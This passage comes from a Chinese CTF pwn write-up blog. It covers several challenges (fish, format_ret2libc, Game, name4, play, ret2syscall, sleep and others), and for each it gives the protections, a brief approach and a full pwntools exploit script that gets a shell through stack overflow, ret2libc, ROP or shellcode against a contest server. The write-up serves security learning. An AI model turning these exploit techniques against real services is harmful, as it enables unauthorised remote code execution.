class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br>    <span class="hljs-comment">#print("main_arena88",hex(main_arena))</span><br>    libc_base = main_arena - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base"</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc_hook = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br><br>    one_gadget = libc_base + one[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment">#修改chunk1的fd改为malloc_hook - 0x23</span><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'aaa'</span>) <span class="hljs-comment">#2-&gt;1</span><br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">1</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#2</span><br><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc_hook+<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>,payload)<br><br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.interactive()<br><br>connect()<br>pwn()<br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br><br></code></pre></td></tr></tbody></table></figure><h2 id="fish"><a href="#fish" class="headerlink" title="fish"></a>fish</h2><h3 id="程序保护-3"><a href="#程序保护-3" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>函数存在gets，溢出控制返回地址为bss段上再执行一次gets。直接溢出输入system(“/bin/sh”)</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2060</span>)<br><span class="hljs-comment">#p = process('./fish')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./fish'</span>)<br>sys = elf.plt[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br>get_plt = elf.plt[<span class="hljs-string">'gets'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_plt))<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>bss = <span class="hljs-number">0x0804A040</span><br>p.sendline(<span class="hljs-string">"123"</span>)<br>payload = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x112</span> + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)<br>p.recvuntil(<span class="hljs-string">b'How many fish does the kitten eat\n'</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b'/bin/sh'</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="format-ret2libc"><a href="#format-ret2libc" class="headerlink" title="format_ret2libc"></a>format_ret2libc</h2><h3 id="程序保护-4"><a href="#程序保护-4" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2107</span>)<br><span class="hljs-comment">#p = process('./format_ret2libc')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br>elf = ELF(<span class="hljs-string">'./format_ret2libc'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x40084B</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400943</span><br><br>payload1 = <span class="hljs-string">"%39$p"</span><br><span class="hljs-comment">#p.recvuntil("Say some words\n")</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">"0x"</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><h3 id="程序保护-5"><a href="#程序保护-5" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2064</span>)<br><span class="hljs-comment">#p = process('./Game')</span><br>elf = ELF(<span class="hljs-string">'./Game'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>main_addr = elf.symbols[<span class="hljs-string">'main'</span>]<br>start = <span class="hljs-number">0x080485F4</span><br><br>offset = <span class="hljs-number">0x64</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span><br><br>p.recvuntil(<span class="hljs-string">'Do you play game?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">'Do you think playing games will affect your learning?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload = <span class="hljs-string">b'a'</span>*offset + p32(puts_plt) + p32(start) + p32(puts_got)<br><span class="hljs-comment">#payload = p32(puts_got)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">'\n'</span>)<br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>log.info(<span class="hljs-string">'puts -&gt; %x'</span>,puts_addr)<br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x05f150</span><br>system_addr = libc + <span class="hljs-number">0x03a950</span><br>binsh_addr = libc + <span class="hljs-number">0x15912b</span><br><br><br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload2 = <span class="hljs-string">b'a'</span>* offset + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="name4"><a href="#name4" class="headerlink" title="name4"></a>name4</h2><h3 id="程序保护-6"><a href="#程序保护-6" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>绕过检查的shellcode</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2116</span>)<br><span class="hljs-comment">#p = process('./name4')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./name4'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"Enter your name:\n"</span>)<br>p.sendline(<span class="hljs-string">'\x00'</span>+shellcode)<br>goal = <span class="hljs-number">0x0804A0E0</span><br>goal1 = <span class="hljs-number">0x0804A080</span> + <span class="hljs-number">1</span><br>p.recvuntil(<span class="hljs-string">'Enter your best friend name:\n'</span>)<br>p.sendline(shellcode)<br><br>p.recvuntil(<span class="hljs-string">'give you stack overflow:\n'</span>)<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0xdeadbeff</span>) + p32(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="play"><a href="#play" class="headerlink" title="play"></a>play</h2><h3 id="程序保护-7"><a href="#程序保护-7" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>通过往bss段上写shellcode再跳转执行</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2063</span>)<br><span class="hljs-comment">#p = process('./play')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./play'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"I think you must enjoy playing.\n"</span>)<br>p.sendline(shellcode)<br>goal = <span class="hljs-number">0x6010A0</span><br>p.recvuntil(<span class="hljs-string">'Name your favorite game?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="程序保护-8"><a href="#程序保护-8" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2syscall 32位的执行 (0xb，0，0，binsh) 再调用80号中断</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#p = process('./ret2syscall_32')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./ret2syscall_32'</span>)<br><br>offset = <span class="hljs-number">0x208</span> + <span class="hljs-number">4</span><br>binsh_addr = <span class="hljs-number">0x080EA068</span><br>pop_eax = <span class="hljs-number">0x080b8576</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806f250</span><br>int80_addr = <span class="hljs-number">0x0806cea3</span><br><br>payload = <span class="hljs-string">b'a'</span>*offset + p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x0</span>) + p32(binsh_addr) + p32(int80_addr)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><h3 id="程序保护-9"><a href="#程序保护-9" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2057</span>)<br><span class="hljs-comment">#p = process('./sleep')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br>elf = ELF(<span class="hljs-string">'./sleep'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x4006BD</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400783</span><br><br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h2 id="stackpivot-x86"><a href="#stackpivot-x86" class="headerlink" title="stackpivot_x86"></a>stackpivot_x86</h2><h3 id="程序保护-10"><a href="#程序保护-10" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span 